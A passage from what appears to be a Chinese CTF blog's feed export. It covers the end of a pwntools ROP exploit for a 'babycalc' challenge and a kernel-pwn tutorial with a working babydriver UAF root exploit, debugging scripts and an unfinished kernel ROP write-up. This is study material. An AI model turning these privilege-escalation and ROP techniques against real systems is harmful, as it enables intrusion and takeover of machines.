3)]</span></span><br></pre></td></tr></table></figure>

<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn_name&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./babycalc&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./babycalc&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line">rs = [<span class="number">19</span>, <span class="number">36</span>, <span class="number">53</span>, <span class="number">70</span>, <span class="number">55</span>, <span class="number">66</span>, <span class="number">17</span>, <span class="number">161</span>, <span class="number">50</span>, <span class="number">131</span>, <span class="number">212</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">199</span>, <span class="number">24</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">strtol_got = elf.got[<span class="string">&#x27;strtol&#x27;</span>]</span><br><span class="line">p_rdi_r = <span class="number">0x0000000000400ca3</span></span><br><span class="line">p_rbp_r = <span class="number">0x00000000004006b0</span></span><br><span class="line">ret_addr = <span class="number">0x00000000004005b9</span></span><br><span class="line">read_again = <span class="number">0x00000000004007B4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *0x00000000004007DC\nb *0x0000000000400BB7&#x27;)</span></span><br><span class="line">pld = <span class="string">b&#x27;24abcdef&#x27;</span></span><br><span class="line">pld += p64(ret_addr) * <span class="number">0x13</span></span><br><span class="line">pld += p64(p_rdi_r) + p64(puts_got) + p64(puts_plt) </span><br><span class="line">pld += p64(p_rbp_r) + p64(strtol_got + <span class="number">0x100</span> - <span class="number">8</span>)</span><br><span class="line">pld += p64(read_again)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rs:</span><br><span class="line">    pld += p8(i)</span><br><span class="line">pld = pld.ljust((<span class="number">0x100</span> - <span class="number">0x4</span>), <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">pld += p32(<span class="number">0x38</span>)</span><br><span class="line">s(pld)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;good done&quot;</span>)</span><br><span class="line">libc_base = uu64() - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>西湖论剑</tag>
      </tags>
  </entry>
  <entry>
    <title>Kernel Pwn</title>
    <url>/2023/01/22/Pwn/Kernel/</url>
    <content><![CDATA[<h2 id="解题准备"><a href="#解题准备" class="headerlink" title="解题准备"></a>解题准备</h2><p>一般内核题会给我们三个文件：<code>start.sh(启动脚本)</code>、<code>bzImage(镜像文件)</code>、<code>rootfs.cpio(文件系统)</code>。</p>
<p>首先查看文件类型和内核版本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解包文件系统</span></span><br><span class="line">cpio -idmv &lt; rootfs.cpio</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看内核版本</span></span><br><span class="line">file bzImage</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">bzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu)</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看 gcc 的版本</span></span><br><span class="line">strings bzImage | grep gcc</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">4.4.72 (atum@ubuntu) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) )</span></span><br></pre></td></tr></table></figure>

<p>需要下载对应版本的内核和gcc（可以通过换源然后<code>sudo apt-get install gcc-X</code>），这样能够避免编译的相关错误。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 内核的下载可以通过官网或者清华源</span></span><br><span class="line"><span class="comment"># 官网：https://mirrors.edge.kernel.org/pub/linux/kernel/</span></span><br><span class="line"><span class="comment"># 清华源：https://mirrors.tuna.tsinghua.edu.cn/kernel/</span></span><br><span class="line">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v4.x/linux-4.4.72.tar.xz</span><br><span class="line">unxz linux-4.4.72.tar.xz</span><br><span class="line">tar -xf linux-4.4.72.tar</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>相关版本的gcc下载比较麻烦，首先需要更换相关的源，然后才能找到对应的gcc，这儿就不展示怎么换源了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-cache policy gcc-5		# 查看能够下载的版本</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230115003115972.png" alt="image-20230115003115972"></p>
<p>然后就可以找对应的版本进行下载，g++的安装也是如此：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install gcc-5=5.4.0-6ubuntu1~16.04.12</span><br></pre></td></tr></table></figure>

<p>接下来就是编译内核了</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 首先需要调整编译参数，保证编译出来的内核具有调试信息</span></span><br><span class="line">make menuconfig</span><br><span class="line"><span class="comment"># Kernel hacking -&gt; Compile-time checks and compiler options -&gt; Compile the kernel with debug info</span></span><br><span class="line"><span class="comment"># Kernel hacking -&gt; KGDB: kernel debugger</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：需要改 Makefile 中的 gcc/g++ 为指定的版本</span></span><br><span class="line"><span class="comment"># 也可以通过修改环境变量来指定 gcc 的版本</span></span><br><span class="line">make -j4 bzImage	<span class="comment"># 仅编译内核</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要文件如下：</span></span><br><span class="line">linux-4.4.72/vmlinux	<span class="comment"># 具有调试信息的 vmlinux</span></span><br><span class="line">linux-4.4.72/arch/x86/boot/bzImage</span><br><span class="line">linux-4.4.72/arch/x86_64/boot/bzImage</span><br><span class="line">linux-4.4.72/scripts/extract-vmlinux	<span class="comment"># 从 bzImage 中提取 vmlinux 的脚本</span></span><br></pre></td></tr></table></figure>



<h2 id="常用脚本"><a href="#常用脚本" class="headerlink" title="常用脚本"></a>常用脚本</h2><p><code>init</code>启动配置，这里给出<code>busybox</code>中的作为演示：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"></span><br><span class="line">insmod /test.ko		<span class="comment"># 挂载内核模块</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh	<span class="comment"># 修改 uid gid 为 0 以提权 /bin/sh 至 root。</span></span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p>内核启动脚本<code>qemu</code>：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \	<span class="comment"># 指定RAM大小</span></span><br><span class="line">    -nographic \	<span class="comment"># 不需要图形化界面</span></span><br><span class="line">    -kernel /home/zyy/kernel/linux-5.4.98/arch/x86/boot/bzImage \	<span class="comment"># 镜像文件</span></span><br><span class="line">    -initrd  ./rootfs.img \		<span class="comment"># 文件系统</span></span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr&quot;</span> \</span><br><span class="line">    -smp cores=2,threads=1 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    --enable-kvm \</span><br><span class="line">    -s		<span class="comment"># 相当于 -gdb tcp::1234</span></span><br></pre></td></tr></table></figure>

<p>解包文件系统的脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir rootfs/</span><br><span class="line">cp rootfs.cpio rootfs/</span><br><span class="line">mv rootfs.cpio rootfs.cpio.bak</span><br><span class="line">cd rootfs/</span><br><span class="line">cpio -idmv &lt; rootfs.cpio</span><br><span class="line">rm rootfs.cpio</span><br></pre></td></tr></table></figure>

<p>打包文件系统的脚本：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">gcc -g -static exp.c -o exp</span><br><span class="line"><span class="built_in">cp</span> exp rootfs/</span><br><span class="line"></span><br><span class="line"><span class="comment"># chmod +x rootfs/init</span></span><br><span class="line"><span class="comment"># chmod g-w -R rootfs/</span></span><br><span class="line"><span class="comment"># chmod o-w -R rootfs/</span></span><br><span class="line"><span class="comment"># sudo chown -R root rootfs/</span></span><br><span class="line"><span class="comment"># sudo chgrp -R root rootfs/</span></span><br><span class="line"><span class="comment"># sudo chmod u+s rootfs/bin/busybox</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> rootfs/</span><br><span class="line">find . | cpio -o -H newc &gt; ../rootfs.cpio</span><br><span class="line"><span class="built_in">cd</span> ..</span><br></pre></td></tr></table></figure>



<h2 id="内核调试"><a href="#内核调试" class="headerlink" title="内核调试"></a>内核调试</h2><p>一些常用的命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用内核源码 script 中的 extract-vmlinux 从 bzImage 中提取 vmlinux</span></span><br><span class="line"><span class="comment"># 注意：这里提取的 vmlinux 是不具有调试信息的，但可以用于寻找 gadget</span></span><br><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">objdump -d vmlinux &gt; gadget</span><br><span class="line">ROPgadget --binary vmlinux --only <span class="string">&#x27;pop|ret&#x27;</span> &gt; gadget	<span class="comment"># 数量大可以重定位到文件里</span></span><br></pre></td></tr></table></figure>

<p>调试命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb -q -ex &quot;set architecture i386:x86-64&quot; -ex &quot;target remote localhost:1234&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加符号表</span></span><br><span class="line">add-symbol-file &lt;vmlinux_path&gt;</span><br><span class="line">add-symbol-file &lt;ko_path&gt; &lt;text_addr&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取内核特定符号地址</span></span><br><span class="line">grep prepare_kernel_cred  /proc/kallsyms</span><br><span class="line">grep commit_creds  /proc/kallsyms</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取驱动加载的基地址</span></span><br><span class="line">find /sys/ | grep &lt;module_name&gt;</span><br><span class="line">grep 0x /sys/module/&lt;module_name&gt;/sections/.*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">内核驱动相关指令</span></span><br><span class="line">insmod &lt;module&gt;		# 加载模块</span><br><span class="line">rmmod &lt;module&gt;		# 删除模块</span><br><span class="line">lsmod			# 列出已经加载的模块</span><br></pre></td></tr></table></figure>

<p>附上一个做题时的调试脚本：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">gdb -q \</span><br><span class="line">    -ex <span class="string">&quot;set architecture i386:x86-64&quot;</span> \</span><br><span class="line">    -ex <span class="string">&quot;target remote localhost:1234&quot;</span> \</span><br><span class="line">    -ex <span class="string">&quot;add-symbol-file &lt;vmlinux_path&gt; (vmlinux_addr)&quot;</span> \</span><br><span class="line">    -ex <span class="string">&quot;add-symbol-file &lt;ko_path&gt; &lt;.text&gt; -s .bss &lt;.bss&gt;&quot;</span></span><br></pre></td></tr></table></figure>



<h2 id="内核保护"><a href="#内核保护" class="headerlink" title="内核保护"></a>内核保护</h2><ul>
<li><p>SMEP</p>
<p>内核态不能执行用户态的代码，防止了ret2usr的攻击手段。查看是否开启SMEP保护，除了可以在qemu启动脚本里看到，也可以使用命令<code>grep smep /proc/cpuinfo</code>。SMEP保护是由CR4寄存器中的第20位来标记是否开启，通常用<code>mov cr4, 0x6f0</code>来绕过。</p>
</li>
<li><p>SMAP</p>
<p>内核态不能访问用户态的数据，防止了内核态栈迁移的攻击手段。查看是否开启SMAP保护，同SMEP查看相同。SMAP保护是由CR4寄存器中的第21位来标记是否开启，通常用<code>mov cr4, 0x6f0</code>来绕过。</p>
</li>
<li><p>KASLR</p>
<p>和用户态一样，对于驱动加载的地址和vmlinux加载的地址都会进行随机化的处理。</p>
</li>
</ul>
<h2 id="Kernel-UAF"><a href="#Kernel-UAF" class="headerlink" title="Kernel UAF"></a>Kernel UAF</h2><h3 id="babydriver（2017ciscn）"><a href="#babydriver（2017ciscn）" class="headerlink" title="babydriver（2017ciscn）"></a>babydriver（2017ciscn）</h3><p>这里由于<code>babydev_struct</code>是全局的，所以当我们两次<code>open(&quot;/dev/babydev&quot;)</code>时，使得产生的两个文件描述符会共享内存，导致在释放掉一个设备后还能对释放的堆块进行修改，这就产生了UAF。</p>
<p>同时在内核中存在一个<code>cred</code>结构体，当修改cred成员<code>uid</code>和<code>gid</code>为0，便可以获得root权限。当我们<code>fork()</code>一个新进程申请的堆块是我们UAF的堆块时，就可以提权成功了。该种利用方法不需要知道具体符号的地址。</p>
<p>这里给出<code>linux-4.4.72</code>（也就是题目的内核版本）的cred结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="type">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>WP如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> cred[<span class="number">0xa8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);		<span class="comment">// read and write</span></span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);     <span class="comment">// multiplexing babydev_struct </span></span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);  <span class="comment">// create chunk size of cred</span></span><br><span class="line">    close(fd1);     <span class="comment">// free chunk size of cred</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fork())    <span class="comment">// child</span></span><br><span class="line">    &#123;   </span><br><span class="line">        write(fd2, cred, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now uid : %d\n&quot;</span>, getuid());</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>    <span class="comment">// parent</span></span><br><span class="line">    &#123;   </span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里再记录一下相关调试的过程，在pwndbg中我们可以查到cred结构体的大小，以及其每个成员的大小，方便我们后期构造。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230117182122863.png" alt="image-20230117182122863"></p>
<p>可以看到我们想要覆盖到gid成员，那么就需要至少<code>0x1c</code>个字节的数据。同时我们也可以查看<code>babydev_struct</code>结构体的情况。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230117183004648.png" alt="image-20230117183004648"></p>
<p>在执行完写入的操作后，我们会发现<code>device_buf</code>所指向的内存的开头字节已经被置零了。</p>
<h2 id="Kernel-ROP"><a href="#Kernel-ROP" class="headerlink" title="Kernel ROP"></a>Kernel ROP</h2><h3 id="core（2018强网杯）"><a href="#core（2018强网杯）" class="headerlink" title="core（2018强网杯）"></a>core（2018强网杯）</h3><h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>首先查看一下保护。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \		# 开启了 kaslr 地址随机化</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>

<p>驱动文件存在canary，需要绕过。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230117193501396.png" alt="image-20230117193501396"></p>
<p>跟着wiki学习一下init脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms		# 将 /proc/kallsyms 保存到 /tmp/kallsyms 中</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict		# 无法从 /proc/kallsyms 中读取信息，但可以从 /tmp/kallsyms 中读取</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict	# 无法使用 dmesg</span><br><span class="line">ifconfig eth0 up	# 激活 eth0</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;	# 定时关机，为了方便调试需要删除</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">echo &#x27;sh end!\n&#x27;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230117200712916.png" alt="image-20230117200712916"></p>
<h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>首先考虑ROP的目标，是达到执行<code>commit_creds(prepare_kernel_cred(0))</code>的目的，那么需要解决的问题：</p>
<ol>
<li>如何获取vmlinux的基地址，达到获取gadget的地址。</li>
<li>如何在执行完gadget后返回到用户态来获取shell。</li>
<li>驱动开启了canary的保护，怎么绕过。</li>
</ol>
<p>考虑问题1：在之前的源码分析中我们发现可以从<code>/tmp/kallsyms</code>文件中找到符号的偏移，例如：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230118093313127.png" alt="image-20230118093313127"></p>
<p>可以发现符号的偏移。除此以外，参照wiki也可以使用pwntools来发现：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230118093512132.png" alt="image-20230118093512132"></p>
<p>由于C语言的基础还是很差，学习一下wiki获取vmlinux基地址的脚本：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// size_t -&gt; unsigned long</span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))	<span class="comment">// 每次从 kallsyms_fd 中读取一行到 buf 中</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)	<span class="comment">// 如果 buf 中存在 &quot;commit_creds&quot; 字符串则进入循环</span></span><br><span class="line">            <span class="comment">// 